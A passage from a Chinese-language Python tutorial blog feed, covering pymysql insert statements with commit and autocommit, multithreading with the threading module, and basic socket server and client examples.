title="6.2.3、执行sql语句-插入"></a>6.2.3、执行sql语句-插入</h4><ul><li>pymysql在执行数据插入或其它产生数据更改sql语句是，默认是需要确认的。</li><li>手动提交更改可以通过<code>连接对象.commit()</code></li><li>或者使用自动提交更改，在创建连接对象中添加<code>autocommit=True</code></li></ul><p>示例：</p><pre><code class="python"># 创建mysql数据库连接from pymysql import Connection  #导包# 获取到mysql数据库的连接对象conn = Connection(    host=&#39;localhost&#39;,   #主机名(或ip)    port=3306,          #端口    user=&#39;root&#39;,        #账户名    password=&#39;123456&#39;,   #密码    autocommit=True     #自动提交更改(和连接对象.commit()效果一样))cursor = conn.cursor()# 创建游标对象conn.select_db(&quot;test&quot;)#选择数据库cursor.execute(&quot;insert into test_table values(10004,&#39;leo&#39;,21)&quot;)#使用游标对象执行sql查询语句#conn.commit()               #手动提交更改conn.close()#关闭数据库连接</code></pre><h2 id="七、多线程编程"><a href="#七、多线程编程" class="headerlink" title="七、多线程编程"></a>七、多线程编程</h2><ul><li>多个进程同时在运行，即不同的程序同时运行，称之为：多任务并行执行</li><li>一个进程内的多个线程同时在运行，称之为：多线程并行执行</li></ul><h3 id="7-1、threading模块"><a href="#7-1、threading模块" class="headerlink" title="7.1、threading模块"></a>7.1、threading模块</h3><p>python多线程可以通过<code>threading</code>内置模块来实现<br>语法：</p><pre><code class="python">import threading#导入包线程对象1=threading.Thread(target=函数)#创建线程1线程对象2=threading.Thread(target=函数,args=(&quot;函数的参数&quot;,))#创建线程2线程对象1.start()#启动多线程任务线程对象2.start()#启动多线程任务</code></pre><p>注意事项：</p><ul><li>函数的参数写到args&#x3D;(“参数”,)元组里面，组后不要忘记加<code>,</code></li></ul><p>示例：</p><pre><code class="python">#threading模块多线程示例import timeimport threadingdef work(name):             #创建一个函数    for x in range(5):        time.sleep(1)        print(f&quot;我是&#123;name&#125;,&#123;x&#125;&quot;)#创建线程一work_threa1=threading.Thread(target=work,args=(&quot;tom&quot;,))#创建线程二work_threa2=threading.Thread(target=work,args=(&quot;alis&quot;,))#启动线程任务work_threa1.start()work_threa2.start()</code></pre><h2 id="八、网络编程"><a href="#八、网络编程" class="headerlink" title="八、网络编程"></a>八、网络编程</h2><p>socket(简称：套接字)是进程之间通信的一个工具，负责进程之间网络数据传输，好比数据的搬运工<br><strong>客户端和服务端</strong></p><ul><li>两个进程之间通过Socket进行相互通讯，就必须有服务端和客户端</li><li>Socket服务端：等待其它进程的连接、可接受发来的消息、可以回复消息(被动)</li><li>Socket客户端：主动连接服务端、可以发送消息、可以接收回复(主动)</li></ul><h3 id="8-1、Socket服务端编程"><a href="#8-1、Socket服务端编程" class="headerlink" title="8.1、Socket服务端编程"></a>8.1、Socket服务端编程</h3><p>创建Socket服务端步骤：</p><pre><code class="python"># 1.创建Socket对象import socketsocket_server = socket.socket()# 2.绑定socket_server到指定ip和端口(元组)socket_server.bind((&quot;0.0.0.0&quot;,7777))# 3. 服务端开始监听端口## listen()里面可以填写int类型的整数，表示允许连接的数量，超出的会等待，不填的话会自动分配socket_server.listen()# 4.接收客户端连接，获得连接对象conn,address = socket_server.accept()## accept方法是一个阻塞方法，如果没有连接，会卡在这一行代码## accept返回的是一个二元元组，用两个变量接收2个元素## address是客户端地址,conn是消息传输对象用来发送和接收消息print(f&quot;接收到客户端连接，地址为&#123;address&#125;&quot;)# 5.客户端连接后，通过recv方法，接收客户端发送的消息client_data = conn.recv(1024).decode(&quot;UTF-8&quot;)## recv方法返回值是字节,通过decode方法使用UTF-8的编码转换为字符串## recv的传参是buffsize，缓冲区大小，一般设置为1024print(client_data)# 6.通过send方法回复客户端消息conn.send(&quot;我已收到你的连接!&quot;.encode(&quot;UTF-8&quot;))## encode方法将字符串转换为二进制# 7.关闭连接conn.close()socket_server.close()</code></pre><h3 id="8-1、Socket客户端编程"><a href="#8-1、Socket客户端编程" class="headerlink" title="8.1、Socket客户端编程"></a>8.1、Socket客户端编程</h3><p>Socket客户端创建步骤：</p><pre><code class="python"># 1.创建sokcet对象import socketsocket_client = socket.socket()# 2.连接到服务端(ip端口为元组)socket_client.connect((&quot;localhost&quot;,8888))# 3. 发送消息socket_client.send(&quot;hello my is client&quot;.encode(&quot;UTF-8&quot;))# 4. 接收消息server_data = socket_client.recv(1024).decode(&quot;UTF-8&quot;)print(server_data)# 5.关闭连接socket_client.close()</code></pre><p>注意事项：</p><ul><li>死循环后的close方法不可执行</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;基础语法-2&quot;&gt;&lt;a href=&quot;#基础语法-2&quot; class=&quot;headerlink&quot; title=&quot;基础语法-2&quot;&gt;&lt;/a&gt;基础语法-2&lt;/h1&gt;&lt;h2 id=&quot;一、文件&quot;&gt;&lt;a href=&quot;#一、文件&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="开发" scheme="http://www.tanglx.cn/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="python" scheme="http://www.tanglx.cn/tags/python/"/>
    
    <category term="开发" scheme="http://www.tanglx.cn/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
</feed>
